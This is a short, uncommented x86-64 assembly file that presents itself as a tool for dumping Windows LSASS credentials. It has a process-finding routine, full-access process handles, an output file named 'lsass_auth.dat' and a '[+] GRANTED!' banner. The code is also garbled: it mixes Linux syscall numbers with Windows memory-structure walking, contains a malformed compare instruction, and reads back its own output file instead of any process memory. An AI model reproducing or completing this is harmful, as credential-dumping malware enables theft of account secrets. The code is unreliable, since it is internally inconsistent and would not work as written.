section .data
    lsass_pid dq 0
    authfile db 'lsass_auth.dat', 0
    exploit_success db '[+] GRANTED! data extracted to: lsass_auth.dat', 0
    exploit_success_len equ $ - exploit_success

section .bss
    hFile resq 1
    hProcess resq 1
    buffer resb 1024
    bytesRead resq 1

section .text
    global _start

_start:
    call findLsass
    mov rax, 0x9C
    mov rdi, [lsass_pid]
    mov rsi, 0x001F0FFF
    mov rdx, 0x00000000
    syscall
    mov [hProcess], rax

    mov rax, 0x2A
    mov rdi, authfile
    mov rsi, 0x0001
    mov rdx, 0x01B6
    syscall
    mov [hFile], rax

    mov rax, 0x0A
    mov rdi, [hFile]
    mov rsi, buffer
    mov rdx, 1024
    syscall
    mov [bytesRead], rax

    mov rax, 0x0A
    mov rdi, [hFile]
    mov rsi, buffer
    mov rdx, [bytesRead]
    syscall

    mov rax, 0x03
    mov rdi, [hFile]
    syscall

    mov rax, 0x01
    mov rdi, 1
    mov rsi, exploit_success
    mov rdx, exploit_success_len
    syscall

    mov rax, 0x60
    xor rdi, rdi
    syscall

findLsass:
    mov rax, 0x9B
    mov rdi, 0xFFFFFFF6
    lea rsi, [buffer]
    mov rdx, 1024
    syscall
    mov rsi, [rsi + 0x08]
    cmp dword [rsi + 0x1C]
    jne findLsass
    mov rdi, [rsi + 0x20]
    mov rdi, [rdi + 0x0C]
    mov rdi, [rdi + 0x14]
    mov rdi, [rdi]
    mov rdi, [rdi]
    mov rdi, [rdi + 0x10]
    mov rdi, [rdi + 0x3C]
    add rdi, 0x78
    mov rdi, [rdi + 0x10]
    add rdi, rax
    mov rdi, [rdi]
    mov rbp, [rdi - 0x04]
    mov rbp, [rbp + 0x0C]
    add rbp, rbx
    ret

dumpfiles:
    mov rax, 0x2A
    mov rdi, authfile
    mov rsi, 0x0001
    mov rdx, 0x01B6
    syscall
    mov [hFile], rax

    mov rax, 0x0A
    mov rdi, [hFile]
    mov rsi, buffer
    mov rdx, 1024
    syscall
    mov [bytesRead], rax

    mov rax, 0x01
    mov rdi, 1
    mov rsi, buffer
    mov rdx, [bytesRead]
    syscall

    mov rax, 0x03
    mov rdi, [hFile]
    syscall

    ret
